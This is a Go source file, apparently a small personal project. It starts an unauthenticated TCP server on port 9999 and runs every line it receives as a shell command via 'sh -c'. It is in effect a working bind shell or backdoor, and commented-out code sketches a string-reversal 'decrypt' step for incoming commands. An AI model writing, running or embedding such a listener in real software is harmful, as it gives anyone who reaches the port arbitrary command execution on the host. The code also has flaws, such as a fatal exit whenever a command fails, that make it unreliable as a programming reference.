package main

import (
	// "fmt"
	"time"
	"net"
	"bufio"
	"io"
	"log"
	"strings"
	// "slices"
	// "sync"
	"os/exec"
)

// var (
// 	CONCURRENCY int = 3
// )
//

func main() {
		listener, err := net.Listen("tcp", ":9999")
		if err != nil {
			log.Fatalf("error while bootstrapping tcp listener: aklsdjf;a: %v\n", err)
		}
		defer listener.Close() 
		log.Println("accepting new connections..")

		for {
				conn, err := listener.Accept()
				if err != nil {
					log.Fatalf("error accepting a new connection")
				}

				go connHandler(conn)
		}
}


func connHandler(conn net.Conn) error {
		defer conn.Close()
		log.Println("New connection! : %s", conn.RemoteAddr().String())

		timeoutDuration := 2 * time.Minute
		reader := bufio.NewReader(conn)

		for {
				_ = conn.SetReadDeadline(time.Now().Add(timeoutDuration))
				command, err := reader.ReadString('\n')
				if  err != nil {
						if err == io.EOF {
								log.Printf("%s Disconnected gracefully..\n", conn.RemoteAddr().String())
						} else {
								log.Print("wasn't able to read for some reason..")
						}	
						return err
				}
				
				_ = runCommand(command)
		}

		return nil
}

func commandHandler() error {
	return nil 
}

func runCommand(command string) error {
		// defer conn.Close()
		out, err := exec.Command("sh", "-c", strings.TrimSpace(command)).Output()

		if err != nil {
			log.Fatalf("error occurred while running the command", err)
			// TODO handle it
			//return err 
		}

		log.Println(string(out)) 
		return nil
}
































// TODO : 

	// if err != nil {
	// 	log.Error("error while reading the tcp connection")
	// }


	//decrypted, err := decrypt(message)
	//fmt.Println(strings.ToUpper(decrypted))

	// fmt.Println(message)
	// err = cmd.Run()
	// cmd := strings.Split("ps -ef") message, "


// func decrypt(v string) (string, error) {
//  //13tor
// 	// n := len(v)
// 	arr := []byte(v)
// 	slices.Reverse(arr)
// 	return string(arr), nil
// }
//
